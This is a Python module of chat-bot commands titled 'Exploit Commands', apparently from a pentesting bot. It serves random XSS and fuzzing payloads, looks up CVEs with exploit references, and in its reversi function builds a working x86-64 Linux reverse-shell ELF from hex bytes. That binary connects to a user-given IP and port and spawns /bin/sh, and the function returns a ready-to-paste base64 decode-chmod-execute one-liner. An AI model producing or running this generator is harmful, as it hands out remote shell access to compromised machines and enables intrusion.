### Exploit Commands

try:
    from core.helper import *
except ImportError:
    from helper import *

import array, base64, binascii, textwrap, urllib.request

async def getXSS(room, event, cmdArgs):
    xss = await getLine("assets/XSSPayloads.txt")
    return "<pre><code>{}</code></pre>".format(xss)
    # room.send_html("<pre><code>{}</code></pre>".format(xss))

async def getFuzz(room, event, cmdArgs):
    fuzz = await getLine("assets/fuzzPayloads.txt")
    return "<pre><code>{}</code></pre>".format(fuzz)
    #room.send_html("<pre><code>{}</code></pre>".format(fuzz))

async def reversi(room, event, cmdArgs):
    ### Binary Template ############################
    b1 = ['7F','45','4C','46','6A','29','58','6A', #
          '02','5F','6A','01','5E','99','EB','3C', #
          '02','00','3E','00','01','00','00','00', #
          '04','00','00','00','01','00','00','00', #
          '1C','00','00','00','00','00','00','00', #
          '00','00','00','00','00','00','00','00', #
          '01','00','00','00','40','00','38','00', #
          '01','00','02','00','04','3B','0F','05', #
          '00','00','00','00','04','3B','0F','05', #
          '00','00','00','00','0F','05','48','97', #
          'C7','44','24','FC']                     #
    # This is where the IP is inserted.            #
    b2 = ['66','C7','44','24','FA']                #
    # This is where the port is inserted.          #
    b3 = ['C6','44','24','F8','02','48','83','EC', #
          '08','6A','2A','58','48','89','E6','6A', #
          '10','5A','0F','05','6A','03','5E','48', #
          'FF','CE','6A','21','58','0F','05','75', #
          'F6','99','88','44','24','FF','48','83', #
          'EC','01','52','48','8D','74','24','F0', #
          '80','C2','10','0F','05','48','31','C0', #
          '48','BB','2F','62','69','6E','2F','2F', #
          '73','68','53','48','89','E7','50','48', #
          '89','E2','57','48','89','E6','EB','8D'] #
    ### End Template ###############################
    if len(cmdArgs) == 2:
        ip   = cmdArgs[0]
        port = cmdArgs[1]
    else:
        return

    if not valid_ip(ip):
        return "Invalid IP! " + await getFace("nay")

    port = await getDigits(port)
    if len(port) > 5:
        return "Invalid Port! " + await getFace("nay")

    try:
        ip   = ip.split('.')
        hexi = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip))
        ia   = re.findall('..',hexi)
        hexp = '{:x}'.format(int(port))
        ha   = re.findall('..',hexp)
        nBin = b1 + ia + b2 + ha + b3
        barr = ''.join(nBin)
        b    = bytearray.fromhex(barr)
    
        b64bin   = base64.b64encode(b)
        oneliner = b64bin.decode('utf-8')
        return "base64 -d <<< " + oneliner + " > s;chmod +x s;./s &"
        #room.send_text("base64 -d <<< " + oneliner + " > s;chmod +x s;./s &")
    except Exception as aiEx:
        await crashLog(event, cmdArgs)

async def cveSearch(room, event, cmdArgs):
    cve  = cmdArgs[0]
    output = ""
    with urllib.request.urlopen('http://cve.circl.lu/api/cve/'+cve) as url:
        data = json.loads(url.read().decode())
        try:
            if 'cvss' in data:
                output += "<h1>{} | CVSS {}</h1>".format(cve,data['cvss'])
            if 'summary' in data:
                output += '+-- Summary '+'-'*68+"\n"
                output += '\n'.join(textwrap.wrap(data['summary'],80))
                output += '\n\n'
            if 'references' in data:
                output += '+-- References '+'-'*65 + '\n'
                for i in data['references']:
                    output += "- "+i+'\n'
                output += "\n"
            if 'exploit-db' in data:
                output += '+-- ExploitDB '+'-'*66 + '\n'
                for d in data['exploit-db']:
                    output += "| Title | {}\n".format(d['title'])
                    output += "|   URL | {}\n".format(d['source'])
                    output += "+-------+"+"-"*71+'\n'
            if 'packetstorm' in data:
                output +=  '\n+-- Packet Storm '+'-'*63 + '\n'
                for p in data['packetstorm']:
                    output += "| Title | {}\n".format(p['title'])
                    output += "|   URL | {}\n".format(p['data source'])
                    output += "+-------+"+"-"*71 + '\n'
            if 'metasploit' in data:
                output += '\n+-- Metasploit '+'-'*65 + '\n'
                for m in data['metasploit']:
                    output += "| Title | {}\n".format(m['title'])
                    output += "|    ID | {}\n".format(m['id'])
                    output += "|   URL | {}\n".format(m['source'])
                    output += "+-------+"+"-"*71 + '\n'
        except (TypeError, KeyError) as aiEx:
            await crashLog(event,aiEx)
    with urllib.request.urlopen('https://api.github.com/search/repositories?q='+cve) as url:
        data = json.loads(url.read().decode())
        try:
            if 'items' in data:
                output += '\n+-- GitHub '+'-'*69 + '\n'
                for i in data['items']:
                    output += "|  Repo | {}\n".format(i['full_name'])
                    output += "|  Desc | {}\n".format(i['description'])
                    output += "|   URL | {}\n".format(i['html_url'])
                    output += "+-------+"+"-"*71 + "\n"
        except (TypeError, KeyError) as aiEx:
            await crashLog(event,aiEx)
    #return output
    return '<pre><code>{}</code></pre>'.format(output)
    #room.send_html('<pre><code>{}</code></pre>'.format(output))
